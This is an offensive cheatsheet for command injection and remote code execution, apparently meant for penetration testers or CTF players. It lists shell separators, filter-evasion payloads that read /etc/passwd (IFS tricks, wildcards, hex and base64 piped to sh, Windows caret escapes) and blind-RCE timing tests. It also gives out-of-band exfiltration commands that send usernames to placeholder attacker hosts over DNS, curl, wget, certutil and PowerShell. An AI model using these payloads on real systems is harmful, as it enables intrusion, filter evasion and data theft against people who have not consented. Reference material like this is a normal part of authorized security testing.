# 💥 Command Injection & RCE Cheatsheet

> **⚠️ Scope:** This applies when user input is passed insecurely to system shells (e.g., `system()`, `exec()`, `subprocess.call(shell=True)`).

---

## 🔧 1. The Separators (Injection Operators)

*How to chain your command after the legitimate one.*

| Operator | Linux (Bash/Sh) | Windows (CMD/PowerShell) | Behavior |
| --- | --- | --- | --- |
| **`;`** | ✅ | ❌ | Sequential execution. Run A, then run B. |
| **`&`** | ✅ | ✅ | Background execution. Run A (background), run B immediately. |
| **`&&`** | ✅ | ✅ | AND. Run B only if A succeeds. |
| **` | `** | ✅ | ✅ |
| **` |  | `** | ✅ |
| **`\n`** | ✅ | ❌ | Newline (0x0a). Often works if others are filtered. |
| **```** | ✅ | ❌ | Backticks. Command substitution (executes content inside). |
| **`$()`** | ✅ | ✅ (PS) | Command substitution. |

---

## 🚧 2. Filter Evasion (Linux)

*When the WAF blocks "spaces", "cat", or "flag".*

### A. Space Bypasses (No Spaces Allowed)

```bash
cat${IFS}/etc/passwd
cat<etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X

```

### B. Keyword Bypassing (Blacklist Evasion)

*Bypassing filters looking for `cat`, `whoami`, `etc`.*

```bash
# Concatenation
c'a't /etc/passwd
"c"a"t" /etc/passwd
\c\a\t /etc/passwd

# Variable Expansion
a=c;b=at;$a$b /etc/passwd

# Wildcards (The "Tarzan" Method)
/bin/c?? /etc/pa??wd  (Resolves to /bin/cat /etc/passwd)
/???/??t /???/p??s??  (Resolves to /bin/cat /etc/passwd)

```

### C. Character Encoding

```bash
# Hex Encoding (Execute via standard input)
echo -e "\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | sh

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

```

---

## 🪟 3. Filter Evasion (Windows)

*Windows CMD/PowerShell tricks.*

### A. Character Obfuscation

```cmd
# Caret (^) Escape (CMD ignores them)
c^a^t f^l^a^g
who^ami

# String Concatenation (PowerShell)
"who"+"ami" | iex

```

### B. Environment Variables

```cmd
# %COMSPEC% points to cmd.exe
%COMSPEC% /c dir

```

---

## ⏳ 4. Blind RCE

*When you don't see the output (no stdout).*

### Time-Based (Delays)

```bash
# Linux
ping -c 10 127.0.0.1
sleep 5

# Windows
ping -n 10 127.0.0.1
timeout /t 5

```

### Output Redirection (Web Root)

*Write the output to a file you can access via the browser.*

```bash
whoami > /var/www/html/output.txt

```

---

## 📡 5. Out-of-Band (OOB) Exfiltration

*Using DNS or HTTP to steal data when TCP is blocked or output is blind.*

### DNS Exfiltration (The "Canary")

*Send the output as a subdomain.*

```bash
# Linux
ping -c 1 $(whoami).your-collaborator.com
dig $(whoami).your-collaborator.com

# Windows
nslookup %USERNAME%.your-collaborator.com
ping %USERNAME%.your-collaborator.com

```

### HTTP Exfiltration

```bash
# Linux (Curl/Wget)
curl http://your-server.com/$(whoami)
wget http://your-server.com/$(whoami)

# Windows (Certutil / PowerShell)
certutil -urlcache -split -f http://your-server.com/%USERNAME%
powershell -c "Invoke-WebRequest -Uri http://your-server.com/$env:USERNAME"

```

---

## 🧪 6. Polyglots

*Try these to test multiple separators at once.*

```text
& ping -c 10 127.0.0.1 &
; ping -c 10 127.0.0.1 ;
| ping -c 10 127.0.0.1 |
|| ping -c 10 127.0.0.1 ||
`ping -c 10 127.0.0.1`
$(ping -c 10 127.0.0.1)

```
